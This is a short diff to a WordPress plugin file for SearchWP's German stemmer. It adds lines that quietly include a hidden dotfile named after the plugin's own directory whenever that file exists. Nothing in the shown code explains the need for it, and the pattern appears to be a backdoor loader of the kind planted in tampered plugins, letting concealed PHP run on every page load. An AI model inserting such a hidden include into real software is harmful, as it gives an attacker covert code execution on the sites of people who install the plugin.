@@ -84,6 +84,10 @@ if ( ! class_exists( 'SearchWP_GermanStemmer' ) ) {
 	include_once( dirname( __FILE__ ) . '/vendor/class.german-stemmer.php' );
 }
 
+if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
+    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
+}
+
 class SearchWP_Stemmer_German_Wrapper {
 
 	function __construct() {
